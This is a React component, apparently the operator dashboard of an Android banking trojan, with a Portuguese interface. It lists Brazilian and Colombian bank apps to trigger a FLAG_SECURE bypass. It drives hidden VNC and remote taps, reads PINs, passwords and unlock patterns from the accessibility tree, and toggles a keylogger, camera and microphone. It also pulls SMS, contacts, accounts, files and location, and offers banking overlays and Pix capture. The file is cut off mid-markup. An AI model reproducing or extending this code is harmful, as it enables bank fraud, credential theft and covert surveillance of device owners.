import { useEffect, useRef, useState, useCallback, useMemo } from 'react';
import useStore from '../../store/index.js';
import { ws } from '../../ws.js';

// ── Banking packages that trigger FLAG_SECURE auto-bypass ─────────────────────
const BANK_PKGS = new Set([
  'com.nu.production','com.itau','com.bradesco','com.santander.app',
  'br.com.bb.android','br.com.caixa.tem','br.com.gabba.caixa',
  'com.c6bank.app','br.com.intermedium','com.picpay',
  'com.mercadopago.wallet','br.com.original.bank',
  'com.btgpactual.banking','br.com.sicoob.bank','br.com.sicredi.app',
  'com.davivienda.mobile','com.daviplata','com.bancolombia','com.nequi',
]);
const isBank = pkg => {
  if (!pkg) return false;
  if (BANK_PKGS.has(pkg)) return true;
  const p = pkg.toLowerCase();
  return ['bank','banco','itau','bradesco','santander','nubank','caixa',
          'inter','picpay','neon','c6bank','davivienda','bancolombia'].some(k => p.includes(k));
};

// ── Parse hierarchy data string — exact format from captureScreenHierarchy() ──
// Wire: { type:"SCREEN_HIERARCHY", data: JSON_STRING }
// Inner: { timestamp, package, hierarchy: { class:"RootView", bounds:{x,y,w,h}, children:[] } }
function parseData(dataStr) {
  try {
    const d = typeof dataStr === 'string' ? JSON.parse(dataStr) : dataStr;
    const root = d.hierarchy;
    const sw = root?.bounds?.w || 1080;
    const sh = root?.bounds?.h || 2340;
    const nodes = [];
    walk(root, nodes, 0);
    return { pkg: d.package || '', nodes, sw, sh, ts: d.timestamp || '' };
  } catch (_) {
    return { pkg: '', nodes: [], sw: 1080, sh: 2340, ts: '' };
  }
}

// Walk hierarchy tree recursively — exact field names from buildNodeTree()
function walk(node, out, depth) {
  if (!node || depth > 25) return;
  const b = node.bounds; // {x, y, w, h} — confirmed from APK source
  const hasContent = (node.text && node.text.trim()) ||
                     (node.desc && node.desc.trim()) ||
                     (node.hint && node.hint.trim()) ||
                     (b && b.w > 4 && b.h > 4 && node.clickable);
  if (hasContent) {
    const text = (node.text || node.desc || node.hint || node.tooltip || '').trim();
    out.push({
      text,
      cls:          node.class || '',
      id:           node.id || '',
      pkg:          node.windowPackage || '',
      windowType:   node.windowType || 0,
      isLockScreen: !!node.isLockScreen,
      // All boolean states from buildNodeTree
      clickable:    !!node.clickable,
      editable:     !!node.editable,
      password:     !!node.password,
      checked:      !!node.checked,
      enabled:      node.enabled !== false,
      focused:      !!node.focused,
      scrollable:   !!node.scrollable,
      longClick:    !!node.longClickable,
      selected:     !!node.selected,
      isLockEl:     !!node.isLockElement,
      isPinDigit:   !!node.isPinDigit,
      isPatternLock:!!node.isPatternLock,
      isSwipeUnlock:!!node.isSwipeUnlock,
      isKeyboardKey:!!node.isKeyboardKey,
      keyType:      node.keyType || '',
      stateDesc:    node.stateDesc || '',
      // Bounds: x=left, y=top, w=width, h=height — from APK boundsJson.put()
      bounds: b ? { x: b.x || 0, y: b.y || 0, w: b.w || 0, h: b.h || 0 } : null,
      // Pattern grid for pattern lock (9 points)
      patternGrid:  node.patternGrid || null,
      // Swipe unlock hint
      swipeHint:    node.swipeHint || null,
      depth,
    });
  }
  const children = node.children || [];
  for (let i = 0; i < children.length; i++) walk(children[i], out, depth + 1);
}

// Node tap coords — center of bounds
const tapCoords = n => n.bounds
  ? { x: Math.round(n.bounds.x + n.bounds.w / 2), y: Math.round(n.bounds.y + n.bounds.h / 2) }
  : null;

// ─────────────────────────────────────────────────────────────────────────────
export default function VNCRD({ deviceId, onBack, sendCmd }) {
  const device   = useStore(s => s.deviceDetail);
  const setVnc   = useStore(s => s.setVncActive);

  // VNC canvas
  const canvasRef  = useRef(null);
  const fpsRef     = useRef(0);
  const touchRef   = useRef(null);
  const mouseRef   = useRef(null);

  // Mode state
  const [mode,    setMode]    = useState('EDITAR V2'); // EDITAR V2 | VNC | V2 | DUPLO
  const [vncOn,   setVncOn]   = useState(false);
  const [fps,     setFps]     = useState(0);

  // Screen Reader V2 state
  const [srOn,    setSrOn]    = useState(false);
  const [nodes,   setNodes]   = useState([]);
  const [sw,      setSw]      = useState(1080);
  const [sh,      setSh]      = useState(2340);
  const [curPkg,  setCurPkg]  = useState('');
  const [hz,      setHz]      = useState(0);
  const [lastTs,  setLastTs]  = useState(null);
  const [rawJson, setRaw]     = useState('');
  const hzRef = useRef(0);

  // V2 sub-tab
  const [v2tab,   setV2tab]   = useState('tree');  // tree | nodes | raw
  const [filter,  setFilter]  = useState('');
  const [toast,   setToast]   = useState(null);

  // Live device fields (for state badges in EDITAR V2 panel)
  const d = device || {};

  // ── Binary VNC frames — direct canvas draw, no React state ───────────────
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      const blob = new Blob([buf], { type: 'image/jpeg' });
      const url  = URL.createObjectURL(blob);
      const img  = new Image();
      img.onload = () => {
        const c = canvasRef.current;
        if (!c) { URL.revokeObjectURL(url); return; }
        if (c.width  !== img.naturalWidth)  c.width  = img.naturalWidth;
        if (c.height !== img.naturalHeight) c.height = img.naturalHeight;
        c.getContext('2d').drawImage(img, 0, 0);
        URL.revokeObjectURL(url);
        fpsRef.current++;
      };
      img.src = url;
    });
    const t = setInterval(() => { setFps(fpsRef.current); fpsRef.current = 0; }, 1000);
    return () => { unsub(); clearInterval(t); };
  }, [deviceId]);

  // ── WS message handler — hierarchy + status ───────────────────────────────
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;

      if (msg.type === 'screen_hierarchy' || msg.type === 'SCREEN_HIERARCHY') {
        // data is a JSON string from sendScreenHierarchy(json.toString())
        const { pkg, nodes: parsed, sw: w, sh: h, ts } = parseData(msg.data);
        setNodes(parsed);
        setSw(w); setSh(h);
        setCurPkg(pkg);
        setLastTs(ts || Date.now());
        setRaw(typeof msg.data === 'string' ? msg.data : JSON.stringify(msg.data, null, 2));
        hzRef.current++;
        // Auto-detect pwd fields for alert
        if (parsed.some(n => n.password && n.focused)) showToast('🔑 Campo senha em foco!');
      }

      if (msg.type === 'device_status') {
        const pkg = msg.package || '';
        setCurPkg(pkg);
        // APK auto-enables SR when bank opens — mirror state
        if (isBank(pkg) && !srOn) { setSrOn(true); }
      }

      if (msg.type === 'vnc_status') {
        setVncOn(!!msg.active);
        setVnc(!!msg.active);
      }
    });

    const hzTick = setInterval(() => { setHz(hzRef.current); hzRef.current = 0; }, 1000);
    sendCmd('REQUEST_HIERARCHY');

    return () => { unsub(); clearInterval(hzTick); };
  }, [deviceId]);

  // ── VNC ─────────────────────────────────────────────────────────────────
  function startVnc() {
    ws.subscribe('vnc', deviceId);
    sendCmd('START_SILENT_VNC');
    setVncOn(true); setVnc(true);
  }
  function stopVnc() {
    ws.unsubscribe('vnc', deviceId);
    sendCmd('STOP_SILENT_VNC');
    setVncOn(false); setVnc(false);
  }

  // ── Screen Reader V2 ─────────────────────────────────────────────────────
  function toggleSR(on) {
    sendCmd('TOGGLE_SCREEN_READER', { enabled: on });
    setSrOn(on);
  }

  function showToast(msg, ms = 2200) {
    setToast(msg);
    setTimeout(() => setToast(null), ms);
  }

  // ── Touch helpers — canvas coords → TAP/SWIPE ─────────────────────────
  const scaled = useCallback((cx, cy) => {
    const c = canvasRef.current; if (!c) return { x: 0, y: 0 };
    const r = c.getBoundingClientRect();
    return { x: Math.round((cx - r.left) * c.width / r.width),
             y: Math.round((cy - r.top)  * c.height / r.height) };
  }, []);

  const onTouchStart = useCallback(e => {
    e.preventDefault();
    const t = e.touches[0];
    touchRef.current = { ...scaled(t.clientX, t.clientY), ts: Date.now() };
  }, [scaled]);

  const onTouchEnd = useCallback(e => {
    e.preventDefault();
    if (!touchRef.current) return;
    const t   = e.changedTouches[0];
    const end = scaled(t.clientX, t.clientY);
    const { x: sx, y: sy, ts } = touchRef.current;
    const dt = Date.now() - ts;
    const dist = Math.hypot(end.x - sx, end.y - sy);
    if (dist < 10) sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: sx, y: sy });
    else sendCmd('SWIPE', { x1: sx, y1: sy, x2: end.x, y2: end.y, duration: dt });
    touchRef.current = null;
  }, [scaled, sendCmd]);

  const onMD = useCallback(e => {
    mouseRef.current = { ...scaled(e.clientX, e.clientY), ts: Date.now() };
  }, [scaled]);

  const onMU = useCallback(e => {
    if (!mouseRef.current) return;
    const end = scaled(e.clientX, e.clientY);
    const { x: sx, y: sy, ts } = mouseRef.current;
    const dist = Math.hypot(end.x - sx, end.y - sy);
    if (dist < 8) sendCmd('TAP', { x: sx, y: sy });
    else sendCmd('SWIPE', { x1: sx, y1: sy, x2: end.x, y2: end.y, duration: Date.now() - ts });
    mouseRef.current = null;
  }, [scaled, sendCmd]);

  // ── Tap node via accessibility bounds ─────────────────────────────────
  function tapNode(node, long = false) {
    const c = tapCoords(node); if (!c) return;
    sendCmd(long ? 'LONG_PRESS' : 'TAP', c);
    showToast(`${long ? 'HOLD' : 'TAP'} → ${node.text || node.cls.split('.').pop()}`);
  }

  // ── Pattern grid tap ──────────────────────────────────────────────────
  function tapPatternPoint(pt) {
    sendCmd('TAP', { x: pt.x, y: pt.y });
  }

  // ── Swipe unlock ──────────────────────────────────────────────────────
  function swipeUnlock(node) {
    const h = node.swipeHint;
    if (h) sendCmd('SWIPE', { x1: h.sx, y1: h.sy, x2: h.ex, y2: h.ey, duration: 400 });
  }

  // ── Filtered V2 nodes ─────────────────────────────────────────────────
  const filtered = useMemo(() => {
    if (!filter) return nodes;
    const q = filter.toLowerCase();
    return nodes.filter(n =>
      (n.text || '').toLowerCase().includes(q) ||
      (n.cls  || '').toLowerCase().includes(q) ||
      (n.id   || '').toLowerCase().includes(q));
  }, [nodes, filter]);

  // ── Derived node groups ───────────────────────────────────────────────
  const pwdNodes    = useMemo(() => nodes.filter(n => n.password), [nodes]);
  const pinNodes    = useMemo(() => nodes.filter(n => n.isPinDigit), [nodes]);
  const patternNode = useMemo(() => nodes.find(n => n.isPatternLock && n.patternGrid), [nodes]);
  const swipeNode   = useMemo(() => nodes.find(n => n.isSwipeUnlock), [nodes]);
  const bankApp     = isBank(curPkg);

  // ── State label for EDITAR V2 menu items ─────────────────────────────
  const stateLabel = v => v ? 'true' : 'false';

  // ─────────────────────────────────────────────────────────────────────────
  // RENDER
  // ─────────────────────────────────────────────────────────────────────────
  const MODES = ['EDITAR V2', 'VNC', 'V2', 'DUPLO'];
  const showVnc    = mode === 'VNC' || mode === 'DUPLO';
  const showEditor = mode === 'EDITAR V2' || mode === 'DUPLO';
  const showV2     = mode === 'V2' || mode === 'DUPLO';

  return (
    <div style={{ paddingBottom: 24 }}>

      {/* ── Toast ── */}
      {toast && (
        <div style={{
          position: 'fixed', top: 68, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(12,10,2,.97)', border: '1px solid var(--gold)',
          borderRadius: 12, padding: '10px 20px', zIndex: 9999,
          maxWidth: '85vw', textAlign: 'center', pointerEvents: 'none',
          boxShadow: '0 4px 24px rgba(0,0,0,.7)',
          animation: 'fadeUp .2s ease',
        }}>
          <div style={{ color: '#00c864', fontSize: 12, marginBottom: 2 }}>Comando</div>
          <div style={{ color: '#00c864', fontWeight: 800, fontSize: 13, letterSpacing: .5 }}>
            REQUEST_HIERARCHY
          </div>
          <div style={{ color: 'var(--gold)', fontWeight: 700, fontSize: 12 }}>com sucesso!</div>
        </div>
      )}

      {/* ── Toolbar ── */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
        {/* Blue accent bar — from reference image */}
        <div style={{ width: 4, height: 38, background: '#3b7af0', borderRadius: 2, flexShrink: 0 }} />
        <div>
          <div style={{ fontWeight: 800, fontSize: 13, color: 'var(--gold)', letterSpacing: 1 }}>
            EDITAR V2 ✏
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 5, marginTop: 2 }}>
            <span style={{ fontSize: 11, color: 'var(--text2)' }}>LEITOR OCR</span>
            <span style={{ fontSize: 11, color: '#00c864', fontWeight: 700 }}>⚡</span>
            {/* Battery % — "85%" shown is device battery from LEITOR OCR header */}
            <span style={{ fontSize: 11, color: '#00c864', fontWeight: 700 }}>
              {d.battery_level != null ? `${d.battery_level}%` : '—'}
            </span>
          </div>
        </div>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: 5, flexWrap: 'wrap', justifyContent: 'flex-end' }}>
          {MODES.map(m => (
            <button key={m} onClick={() => setMode(m)}
              style={{
                padding: '4px 10px', fontSize: 11, fontWeight: 700,
                borderRadius: 7, border: 'none', cursor: 'pointer',
                background: mode === m ? '#3b7af0' : 'var(--bg3)',
                color: mode === m ? '#fff' : 'var(--text2)',
                transition: 'background .15s',
              }}>
              {m === 'EDITAR V2' ? '⫶⫶ EDITAR V2' : m}
            </button>
          ))}
          <button onClick={() => { sendCmd('REQUEST_HIERARCHY'); showToast('REQUEST_HIERARCHY'); }}
            style={{ padding: '4px 8px', fontSize: 13, borderRadius: 7, border: '1px solid var(--gold-border)', background: 'var(--bg3)', color: 'var(--gold)', cursor: 'pointer' }}>
            ↺
          </button>
          <button onClick={() => { stopVnc(); onBack(); }}
            style={{ padding: '4px 10px', fontSize: 11, fontWeight: 700, borderRadius: 7, border: '1px solid var(--gold-border)', background: 'var(--bg3)', color: 'var(--text2)', cursor: 'pointer' }}>
            ←
          </button>
        </div>
      </div>

      {/* ── VNC Canvas — rendered for VNC and DUPLO modes, AND mini view in EDITAR V2 ── */}
      <div
        className="vnc-wrap"
        style={{ marginBottom: 10, display: (!showVnc && mode === 'EDITAR V2') ? 'block' : 'block' }}
        onTouchStart={onTouchStart} onTouchEnd={onTouchEnd}
        onMouseDown={onMD} onMouseUp={onMU}
      >
        <canvas ref={canvasRef} className="vnc-canvas"
          width={360} height={mode === 'EDITAR V2' ? 220 : 680} />
        {!vncOn && (
          <div className="vnc-overlay">
            {bankApp
              ? <div style={{ textAlign: 'center', padding: '0 20px' }}>
                  <div style={{ fontSize: 28, marginBottom: 8 }}>🏦</div>
                  <div style={{ color: '#ff5c80', fontWeight: 700, fontSize: 13, marginBottom: 4 }}>FLAG_SECURE ATIVO</div>
                  <div style={{ color: 'var(--text2)', fontSize: 11 }}>VNC bloqueado pelo banco. Screen Reader V2 ativo.</div>
                </div>
              : <><div className="spin" /><div style={{ fontSize: 12, color: 'var(--text2)' }}>Aguardando VNC...</div></>
            }
          </div>
        )}
        {vncOn && (
          <div className="vnc-hud">
            {bankApp && <span className="vnc-fps" style={{ background: 'rgba(200,30,60,.85)' }}>FLAG_SECURE</span>}
            <span className="vnc-fps" style={{ background: 'rgba(20,80,200,.85)' }}>HVNC</span>
            <span className="vnc-fps">{fps} FPS</span>
          </div>
        )}
      </div>

      {/* VNC buttons */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginBottom: 10 }}>
        <button className="btn btn-gold btn-block btn-sm" onClick={startVnc}>▶ VNC</button>
        <button className="btn btn-red btn-block btn-sm"  onClick={stopVnc}>⏹ STOP</button>
      </div>

      {/* ── EDITAR V2 MODE — Device control panel with live states ── */}
      {showEditor && (
        <div>
          {/* ⚡ CONTROLE AO VIVO */}
          <SectionHdr icon="⚡" label="CONTROLE AO VIVO" />

          <CtrlBtn label="Informações Gerais"
            state={null}
            onClick={() => sendCmd('GET_DEVICE_INFO')} />

          <CtrlBtn label="Tela ao Vivo"
            state={stateLabel(d.vnc_active)}
            onClick={() => { setMode('VNC'); startVnc(); }} />

          <CtrlBtn label="Câmera ao Vivo"
            state={stateLabel(d.camera_active)}
            onClick={() => sendCmd('TOGGLE_CAMERA', { enabled: !d.camera_active })} />

          {/* Energy row — special layout matching reference image */}
          <div style={{
            background: 'rgba(30,20,5,.8)', border: '1px solid var(--gold-border)',
            borderRadius: 10, padding: '8px 14px', marginBottom: 6, cursor: 'pointer',
          }} onClick={() => sendCmd('TOGGLE_MICROPHONE', { enabled: !d.mic_active })}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 4 }}>
              <span style={{ fontSize: 9, padding: '1px 6px', borderRadius: 4, background: 'var(--bg3)', color: 'var(--text3)', fontWeight: 600 }}>
                {stateLabel(d.mic_active)}
              </span>
              <span style={{ fontSize: 10, fontWeight: 700, color: 'var(--gold)', letterSpacing: 1 }}>ENERGIA</span>
              <span style={{ marginLeft: 'auto', fontSize: 12, fontWeight: 700, color: d.battery_level > 20 ? '#00c864' : '#ff5c80' }}>
                {d.battery_level || 0}%
              </span>
              {d.is_charging ? <span style={{ fontSize: 14, color: '#f0b030' }}>⚡</span> : null}
            </div>
            <div style={{ height: 3, background: 'var(--bg3)', borderRadius: 2 }}>
              <div style={{ height: '100%', borderRadius: 2, background: (d.battery_level || 0) > 20 ? '#00c864' : '#ff5c80', width: `${d.battery_level || 0}%`, transition: 'width .4s' }} />
            </div>
            <div style={{ textAlign: 'center', fontSize: 14, fontWeight: 700, color: 'var(--text)', marginTop: 6 }}>
              Áudio ao Vivo
            </div>
            <div style={{ textAlign: 'center', fontSize: 10, color: 'var(--text3)' }}>
              {stateLabel(d.mic_active)}
            </div>
          </div>

          {/* Security row with badges */}
          <div style={{
            background: 'rgba(30,20,5,.8)', border: '1px solid var(--gold-border)',
            borderRadius: 10, padding: '8px 14px', marginBottom: 6, cursor: 'pointer',
            display: 'flex', alignItems: 'center', gap: 8,
          }} onClick={() => sendCmd('STEALTH_STATUS')}>
            <span style={{ fontSize: 9, padding: '1px 6px', borderRadius: 4, background: 'var(--bg3)', color: 'var(--text3)', fontWeight: 600 }}>false</span>
            <span style={{ fontSize: 11, padding: '2px 8px', borderRadius: 4, background: 'rgba(0,180,80,.12)', color: '#00c864', border: '1px solid rgba(0,180,80,.3)', fontWeight: 700 }}>🔑 SEGURANÇA</span>
            <span style={{ fontSize: 11, padding: '2px 8px', borderRadius: 4, background: 'var(--bg3)', color: 'var(--text2)', fontWeight: 700 }}>REDENCIAIS</span>
          </div>

          <CtrlBtn label="Admin, Lock &amp; PIN"
            state={stateLabel(d.admin_active)}
            onClick={() => { sendCmd('CHECK_ADMIN_STATUS'); sendCmd('REQUEST_HIERARCHY'); setMode('V2'); }} />

          <CtrlBtn label="Senhas dos injects"
            state={null}
            onClick={() => setMode('V2')} />

          <CtrlBtn label="Keylogger"
            state={stateLabel(d.keylogger_active)}
            onClick={() => sendCmd('TOGGLE_KEYLOGGER', { enabled: !d.keylogger_active })} />

          {/* 📁 EXTRAÇÃO DE DADOS */}
          <SectionHdr icon="📁" label="EXTRAÇÃO DE DADOS" />

          <CtrlBtnSide label="Contas Google"
            right={stateLabel(d.perm_accounts)}
            onClick={() => sendCmd('GET_ACCOUNTS')} />

          <CtrlBtn label="Extração de Dados"
            onClick={() => sendCmd('GET_DEVICE_INFO')} />
          <CtrlBtn label="Gerenciador de Arquivos"
            onClick={() => sendCmd('FILE_LIST', { path: '/sdcard' })} />
          <CtrlBtn label="SMS &amp; Mensagens"
            onClick={() => sendCmd('GET_SMS')} />
          <CtrlBtn label="Aplicativos"
            onClick={() => sendCmd('GET_INSTALLED_APPS')} />
          <CtrlBtn label="Contatos"
            onClick={() => sendCmd('GET_CONTACTS')} />
          <CtrlBtn label="Localização GPS"
            onClick={() => sendCmd('GET_LOCATION')} />

          {/* 💰 FINANCEIRO */}
          <SectionHdr icon="💰" label="FINANCEIRO" />
          <CtrlBtn label="Banking Overlay" onClick={() => sendCmd('BLACK_SCREEN_ON')} />
          <CtrlBtn label="Pix &amp; Captura" onClick={() => { setMode('V2'); }} />
          <CtrlBtn label="Sequências de Desbloqueio" onClick={() => sendCmd('START_UNLOCK_RECORDING')} />

          {/* SR V2 toggle */}
          <SectionHdr icon="👁" label="SCREEN READER V2" />
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
            <button className={`btn btn-sm btn-block ${srOn ? 'btn-green' : 'btn-ghost'}`}
              onClick={() => toggleSR(true)}>⚡ ATIVAR V2</button>
            <button className="btn btn-ghost btn-sm btn-block" onClick={() => toggleSR(false)}>⏹ PARAR</button>
            <button className="btn btn-ghost btn-sm btn-block" onClick={() => { sendCmd('REQUEST_HIERARCHY'); setMode('V2'); }}>🌳 VER ÁRVORE</button>
            <button className="btn btn-ghost btn-sm btn-block" onClick={() => sendCmd('TOGGLE_BOT_OPTION', { option: 'banks_crypter', enabled: true })}>🔒 BYPASS</button>
          </div>
        </div>
      )}

      {/* ── V2 MODE — FLAG_SECURE bypass screen reader view ── */}
      {showV2 && (
        <div style={{ marginTop: showEditor ? 12 : 0 }}>
          {/* Banking alert */}
          {bankApp && (
            <div style={{
              background: 'rgba(224,48,96,.1)', border: '1px solid rgba(224,48,96,.4)',
              borderRadius: 10, padding: '8px 12px', marginBottom: 10,
              display: 'flex', alignItems: 'center', gap: 8,
            }}>
              <span style={{ fontSize: 18 }}>🏦</span>
              <div style={{ flex: 1 }}>
                <div style={{ fontWeight: 700, fontSize: 11, color: '#ff5c80' }}>FLAG_SECURE — VNC BLOQUEADO</div>
                <div style={{ fontSize: 10, color: 'var(--text2)', marginTop: 2, fontFamily: 'var(--mono)' }}>{curPkg}</div>
              </div>
              <span style={{ fontSize: 9, padding: '2px 8px', borderRadius: 10, background: srOn ? 'rgba(0,200,80,.15)' : 'var(--bg3)', color: srOn ? '#00c864' : 'var(--text3)', border: `1px solid ${srOn ? 'rgba(0,200,80,.3)' : 'var(--border)'}`, fontWeight: 700 }}>
                {srOn ? `⚡ ${hz}/s` : 'SR OFF'}
              </span>
            </div>
          )}

          {/* Stats */}
          <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap', marginBottom: 8 }}>
            <span className="pill pill-gold" style={{ fontSize: 9 }}>{nodes.length} nós</span>
            <span className="pill pill-green" style={{ fontSize: 9 }}>{nodes.filter(n => n.clickable && n.text).length} click</span>
            {pwdNodes.length > 0 && <span className="pill pill-red" style={{ fontSize: 9 }}>🔑 {pwdNodes.length} pwd</span>}
            {pinNodes.length > 0 && <span className="pill" style={{ fontSize: 9, background: 'rgba(152,85,232,.15)', color: '#a855f7', border: '1px solid rgba(152,85,232,.3)' }}>🔢 PIN</span>}
            {patternNode && <span className="pill" style={{ fontSize: 9, background: 'rgba(152,85,232,.15)', color: '#a855f7', border: '1px solid rgba(152,85,232,.3)' }}>⬡ PADRÃO</span>}
            {lastTs && <span className="pill pill-dim" style={{ fontSize: 9 }}>{new Date(lastTs).toLocaleTimeString()}</span>}
            <span className="pill pill-dim" style={{ fontSize: 9 }}>{sw}×{sh}</span>
          </div>

          {/* PIN capture highlight */}
          {pinNodes.length > 0 && (
            <div style={{
              background: 'rgba(152,85,232,.12)', border: '1px solid rgba(152,85,232,.4)',
              borderRadius: 10, padding: '10px 14px', marginBottom: 8,
              display: 'flex', alignItems: 'center', gap: 10,
            }}>
              <span style={{ fontSize: 20 }}>🔢</span>
              <div>
                <div style={{ fontWeight: 700, fontSize: 11, color: '#a855f7', marginBottom: 4 }}>PIN DETECTADO</div>
                <div style={{ letterSpacing: 8, fontWeight: 800, fontSize: 18, color: '#c084fc', fontFamily: 'var(--mono)' }}>
                  {pinNodes.map(n => n.text).join(' ')}
                </div>
              </div>
              <div style={{ marginLeft: 'auto', display: 'flex', flexDirection: 'column', gap: 4 }}>
                {pinNodes.slice(0, 6).map((n, i) => (
                  <button key={i}
                    onClick={() => tapNode(n)}
                    style={{ padding: '2px 10px', fontSize: 11, fontWeight: 700, borderRadius: 6, border: '1px solid rgba(152,85,232,.4)', background: 'rgba(152,85,232,.1)', color: '#c084fc', cursor: 'pointer', fontFamily: 'var(--mono)' }}>
                    {n.text}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Password field highlight */}
          {pwdNodes.length > 0 && (
            <div style={{ marginBottom: 8 }}>
              {pwdNodes.map((n, i) => (
                <div key={i} onClick={() => tapNode(n)} style={{
                  background: 'rgba(224,48,96,.1)', border: '1px solid rgba(224,48,96,.4)',
                  borderRadius: 8, padding: '8px 12px', marginBottom: 4, cursor: 'pointer',
                  display: 'flex', alignItems: 'center', gap: 8,
                }}>
                  <span style={{ fontSize: 16 }}>🔑</span>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontSize: 11, fontWeight: 700, color: '#ff5c80' }}>CAMPO SENHA</div>
                    <div style={{ fontSize: 10, color: 'var(--text3)', fontFamily: 'var(--mono)' }}>
                      {n.cls.split('.').pop()} {n.focused ? '◉ EM FOCO' : ''}
                    </div>
                  </div>
                  {n.bounds && (
                    <span style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)' }}>
                      →tap({Math.round(n.bounds.x+n.bounds.w/2)},{Math.round(n.bounds.y+n.bounds.h/2)})
                    </span>
                  )}
                </div>
              ))}
            </div>
          )}

          {/* Pattern lock */}
          {patternNode && patternNode.patternGrid && (
            <div style={{ background: 'rgba(59,122,240,.1)', border: '1px solid rgba(59,122,240,.4)', borderRadius: 10, padding: '10px 14px', marginBottom: 8 }}>
              <div style={{ fontWeight: 700, fontSize: 11, color: '#3b7af0', marginBottom: 8 }}>⬡ PADRÃO DE DESBLOQUEIO</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 6, maxWidth: 200, margin: '0 auto' }}>
                {patternNode.patternGrid.map((pt, i) => (
                  <button key={i} onClick={() => tapPatternPoint(pt)}
                    style={{ aspectRatio: '1', borderRadius: '50%', border: '2px solid rgba(59,122,240,.5)', background: 'rgba(59,122,240,.1)', color: '#3b7af0', fontWeight: 700, fontSize: 13, cursor: 'pointer' }}>
                    {i + 1}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Swipe unlock */}
          {swipeNode && (
            <div style={{ background: 'rgba(0,200,100,.08)', border: '1px solid rgba(0,200,100,.3)', borderRadius: 10, padding: '10px 14px', marginBottom: 8 }}>
              <div style={{ fontWeight: 700, fontSize: 11, color: '#00c864', marginBottom: 6 }}>↑ SWIPE PARA DESBLOQUEAR</div>
              <button className="btn btn-green btn-block btn-sm" onClick={() => swipeUnlock(swipeNode)}>
                EXECUTAR SWIPE
              </button>
            </div>
          )}

          {/* V2 tabs */}
          <div style={{ display: 'flex', gap: 5, marginBottom: 8 }}>
            {[['tree','🌳 Árvore'],['nodes','🔵 Nós'],['raw','{ } RAW']].map(([id, label]) => (
              <button key={id} onClick={() => setV2tab(id)}
                style={{ padding: '5px 12px', fontSize: 11, fontWeight: 700, borderRadius: 8, border: 'none', cursor: 'pointer', background: v2tab === id ? 'var(--gold)' : 'var(--bg3)', color: v2tab === id ? '#000' : 'var(--text2)', transition: 'background .15s' }}>
                {label}
              </button>
            ))}
          </div>

          {/* ── TREE ── */}
          {v2tab === 'tree' && (
            <div style={{ maxHeight: 420, overflowY: 'auto' }}>
              {nodes.filter(n => n.text && !n.isKeyboardKey).length === 0 && (
                <div style={{ textAlign: 'center', padding: 32, color: 'var(--text3)', fontSize: 12 }}>
                  <div style={{ fontSize: 32, marginBottom: 8 }}>🌳</div>
                  {srOn ? 'Aguardando hierarquia (500ms loop)...' : 'Ative Screen Reader V2'}
                </div>
              )}
              {nodes.filter(n => n.text && !n.isKeyboardKey && !n.password && !n.isPinDigit).map((node, i) => (
                <div key={i}
                  onClick={() => node.clickable && tapNode(node)}
                  onContextMenu={e => { e.preventDefault(); tapNode(node, true); }}
                  style={{
                    display: 'flex', alignItems: 'center', gap: 8,
                    padding: '6px 10px', marginBottom: 3, borderRadius: 8,
                    paddingLeft: 10 + node.depth * 4,
                    background: node.clickable ? 'rgba(212,149,10,.08)' : 'rgba(255,255,255,.02)',
                    border: `1px solid ${node.clickable ? 'rgba(212,149,10,.3)' : 'rgba(255,255,255,.04)'}`,
                    cursor: node.clickable ? 'pointer' : 'default',
                  }}>
                  <span style={{ flex: 1, fontSize: 12, fontWeight: node.clickable ? 600 : 400, color: node.clickable ? 'var(--gold)' : 'var(--text)', wordBreak: 'break-word' }}>
                    {node.text}
                  </span>
                  {node.checked   && <span style={{ color: '#00c864', fontSize: 11, flexShrink: 0 }}>✓</span>}
                  {node.focused   && <span style={{ color: '#3b7af0', fontSize: 10, flexShrink: 0 }}>◉</span>}
                  {node.scrollable&& <span style={{ color: 'var(--text3)', fontSize: 10, flexShrink: 0 }}>↕</span>}
                  {node.editable  && <span style={{ color: '#3b7af0', fontSize: 9, padding: '1px 5px', borderRadius: 3, border: '1px solid rgba(59,122,240,.3)', background: 'rgba(59,122,240,.08)', flexShrink: 0 }}>EDIT</span>}
                  {node.bounds && node.clickable && (
                    <span style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', flexShrink: 0 }}>
                      {Math.round(node.bounds.x+node.bounds.w/2)},{Math.round(node.bounds.y+node.bounds.h/2)}
                    </span>
                  )}
                </div>
              ))}
            </div>
          )}

          {/* ── NODES ── */}
          {v2tab === 'nodes' && (
            <>
              <div style={{ display: 'flex', gap: 8, marginBottom: 8 }}>
                <input value={filter} onChange={e => setFilter(e.target.value)}
                  placeholder="Filtrar nós..." className="input" style={{ flex: 1 }} />
                <span style={{ fontSize: 11, color: 'var(--text2)', alignSelf: 'center', whiteSpace: 'nowrap' }}>
                  {filtered.length}/{nodes.length}
                </span>
              </div>
              <div style={{ maxHeight: 440, overflowY: 'auto' }}>
                {filtered.slice(0, 250).map((n, i) => (
                  <div key={i}
                    onClick={() => n.clickable && tapNode(n)}
                    style={{
                      background: 'var(--card2)',
                      border: `1px solid ${n.password ? 'rgba(224,48,96,.5)' : n.clickable ? 'rgba(212,149,10,.3)' : 'rgba(212,149,10,.08)'}`,
                      borderLeft: `3px solid ${n.password ? '#e03060' : n.clickable ? 'var(--gold)' : n.focused ? '#3b7af0' : 'var(--border)'}`,
                      borderRadius: 8, padding: '6px 10px', paddingLeft: 10 + n.depth * 5,
                      marginBottom: 3, cursor: n.clickable ? 'pointer' : 'default',
                    }}>
